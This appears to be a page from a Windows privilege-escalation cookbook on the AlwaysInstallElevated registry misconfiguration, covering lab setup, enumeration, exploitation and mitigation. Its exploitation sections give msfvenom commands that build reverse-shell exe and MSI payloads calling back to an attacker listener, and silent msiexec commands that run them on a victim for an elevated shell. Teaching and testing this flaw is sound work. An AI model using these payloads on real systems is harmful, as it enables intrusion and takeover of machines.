# AlwaysInstallElevated

[Back to main](https://github.com/nickvourd/Windows-Local-Privilege-Escalation-Cookbook?tab=readme-ov-file#vulnerabilities)

## Table of Contents

- [AlwaysInstallElevated](#alwaysinstallelevated)
  - [Table of Contents](#table-of-contents)
  - [Description](#description)
  - [Lab Setup](#lab-setup)
    - [Manual Lab Setup](#manual-lab-setup)
    - [PowerShell Script Lab Setup](#powershell-script-lab-setup) 
  - [Enumeration](#enumeration)
    - [Manual Enumeration](#manual-enumeration)
    - [Tool Enumeration](#tool-enumeration)
  - [Exploitation](#exploitation)
    - [Manual Exploitation](#manual-exploitation)
    - [Tool Exploitation](#tool-Exploitation)
  - [Mitigation](#mitigation)
  - [References](#references)
 
## Description

"AlwaysInstallElevated" is a Windows Registry setting that affects the behavior of the Windows Installer service. The vulnerability arises when the "AlwaysInstallElevated" registry key is configured with a value of "1" in the Windows Registry.

When this registry key is enabled, it allows non-administrator users to install software packages with elevated privileges. In other words, users who shouldn't have administrative rights can exploit this vulnerability to execute arbitrary code with elevated permissions, potentially compromising the security of the system.

## Lab Setup

### Manual Lab Setup

Open a cmd with local Administrator privileges and type `gpedit.msc` to open the Local Group Policy Editor.

1) Navigate to **Computer Configuration** -> **Administrative Templates** -> **Windows Components** -> **Windows Installer**:

![AlwaysInstallElevated-Computer-Configuratior-1](/Pictures/AllwaysInstallElevated-Computer-1.png)

2) Enable the "**Always install with elevated privileges**" policy:

![AlwaysInstallElevated-Computer-Configuratior-2](/Pictures/AllwaysInstallElevated-Computer-2.png)

3) Confirm that the "**Always install with elevated privileges**" policy is set to **Enabled**:

![AlwaysInstallElevated-Computer-Configuratior-3](/Pictures/AllwaysInstallElevated-Computer-3.png)

4) Then, navigate to **User Configuration** -> **Administrative Templates** -> **Windows Components** -> **Windows Installer**:

![AlwaysInstallElevated-User-Configuratior-4](/Pictures/AllwaysInstallElevated-User-4.png)

5) Enable the "**Always install with elevated privileges**" policy:

![AlwaysInstallElevated-User-Configuratior-5](/Pictures/AllwaysInstallElevated-User-5.png)

6) Confirm that the "**Always install with elevated privileges**" policy is set to **Enabled**:

![AlwaysInstallElevated-User-Configuratior-6](/Pictures/AllwaysInstallElevated-User-6.png)

7) Open the command prompt with local Administrator privileges and execute the following command to update the computer policy:

```
gpupdate /force
```

Outcome:

![Update-Computer-Policy](/Pictures/Update-Computer-Policy.png)

### PowerShell Script Lab Setup 

Another way to set up the lab with the 'AlwaysInstallElevated' vulnerability is by using the custom PowerShell script named [AlwaysInstallElevated.ps1](/Lab-Setup-Scripts/AlwaysInstallElevated.ps1).

Open a PowerShelll with local Administrator privileges and run the script:

```
.\AlwaysInstallElevated.ps1
```

Outcome:

![AlwaysInstallElevated-Lab-Setup-Script](/Pictures/AllwaysInstallElevated-Lab-Setup-Script.png)

## Enumeration

### Manual Enumeration

To perform manual enumeration and identify whether a Windows workstation is vulnerable to the AlwaysInstallElevated issue, you can use the following commands from a command prompt:

```
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

and

```
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

Outcome:

![AlwaysInstallElevated-Manual-Enumeration](/Pictures/AlwaysInstallElevated-Manual-Enumeration.png)

:information_source: If either command returns a value of 1, it indicates a potential vulnerability, enabling non-administrative users to install software with elevated privileges. 

### Tool Enumeration

To run the SharpUp tool and perform an enumeration of the `AlwaysInstallElevated` vulnerability, you can execute the following command with appropriate arguments:

```
SharpUp.exe audit AlwaysInstallElevated
```

Outcome:

![AlwaysInstallElevated-SharpUp](/Pictures/AlwaysInstallElevated-SharpUp.png)

:information_source: Moreover, you can use `SharpUp.exe audit` to perform a comprehensive enumeration of all misconfigurations vulnerabilities on the specified machine.

## Exploitation

### Manual Exploitation

:information_source: In order to create a MSI file with Visual Studio, you should have pre-installed the extension named **Mictosoft Visual Studio Installer Projects 2022**.

Open an existing random project-> go to **Extensions** tab -> **Manage extensions** in Visual Studio. Go to the Online section, look for the extension, and download it. After successfully downloading, reopen Visual Studio.

![Add-Exetnsion-In-Visual-Studio](/Pictures/Add-Exetension-Visula-Studio.png)

The installation will be scheduled after you close Visual Studio. When you reopen it, the extension will be ready to use.

:warning: If the extension is already pre-installed, please disregard the above steps.

1) Use msfvenom to generate a malicious executable (exe) file:

```
msfvenom -p windows/x64/shell_reverse_tcp lhost=eth0 lport=1234 -f exe > nickvourd.exe
```

2) Open Visual studio, select **Create a new project** and type **installer** into search box. Select the **Setup Wizard** project and click **Next**:

![Visual-Studio-MSI-1](/Pictures/Visual-Studio-MSI-1.png)

3) Provide the project with a name, for example, **NCVInstaller**. Choose a location, for example, **C:\Payloads**, opt for **placing the solution and project in the same directory**, and then click on **Create**:

![Visual-Studio-MSI-2](/Pictures/Visual-Studio-MSI-2.png)

4) Keep clicking **Next** button until you get to step 3 of 4 (choose files to include). Click **Add** and select a malicous payload (i.e, an exe from msfvenom). Then click **Finish**:

![Visual-Studio-MSI-3](/Pictures/Visual-Studio-MSI-3.png)

5) Highlight the **NCVInstaller** project in the **Solution Explorer** and in the **Properties**, change the **TargetPlatform** from **x86** to **x64**:

![Visual-Studio-MSI-4](/Pictures/Visual-Studio-MSI-4.png)

6) Now right-click on the project and select **View** > **Custom Actions**:

![Visual-Studio-MSI-5](/Pictures/Visual-Studio-MSI-5.png)

7) Right-click on **Install** option and select **Add Custom Action**:

![Visual-Studio-MSI-6](/Pictures/Visual-Studio-MSI-6.png)

8) Double-click on **Application Folder**, select your malicious executable file (i.e, nickvourd.exe) and click **OK**. This will ensure that the malicious payload is executed as soon as the installer is run.

![Visual-Studio-MSI-7](/Pictures/Visual-Studio-MSI-7.png)

9) Change **Run64Bit** option from **False** to **True**:

![Visual-Studio-MSI-8](/Pictures/Visual-Studio-MSI-8.png)

10)  Build the solution.

11) Open a listener on your Kali machine.

12) Transfer the malicious MSI file to the victim's machine.

13) Initiate the installation process for the malicious MSI package silently without any user interface:

```
msiexec /quiet /qn /i NCVInstaller.msi
```

Outcome:

![MSI-Execution](/Pictures/MSI-Execution.png)

14) Verify the reverse shell on your Kali machine:

![Elevated-Privileges-Confirmation](/Pictures/AllwaysInstall-Priv-Esc.png)

:information_source: In order to remove the malicious MSI file from the victim, run the following command (in a unprivilege session):

```
msiexec /q /n /uninstall NCVInstaller.msi
```

### Tool Exploitation

1) To perform exploitation with msfvenom, you can use the following command to create a malicious MSI file:

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=eth0 LPORT=1234 -f msi > nickvourd.msi
```

2) Open a listener on your Kali machine.

3) Transfer the malicious MSI file to the victim's machine.

4) Initiate the installation process for the malicious MSI package silently without any user interface:

```
msiexec /quiet /qn /i nickvourd.msi
```

5) Verify the reverse shell on your Kali machine:

![AlwaysInstallElevated-Elevated-Privileges](/Pictures/AllwaysInstall-Priv-Esc.png)

:information_source: In order to remove MSI file from the victim, run the following command (in a unprivilege session):

```
msiexec /q /n /uninstall nickvourd.msi
```

## Mitigation

To mitigate the `AlwaysInstallElevated` vulnerability, it is recommended to set the `AlwaysInstallElevated` value to `0` in both the `HKEY_LOCAL_MACHINE` and `HKEY_CURRENT_USER` hives in the Windows Registry.

## References

- [AlwaysInstallElevated Microsoft](https://learn.microsoft.com/en-us/windows/win32/msi/alwaysinstallelevated)
- [Windows Installer Microsoft](https://learn.microsoft.com/en-us/windows/win32/msi/windows-installer-portal)
- [How to Create the Windows Installer File (*.msi) Microsoft](https://learn.microsoft.com/en-us/mem/configmgr/develop/apps/how-to-create-the-windows-installer-file-msi)
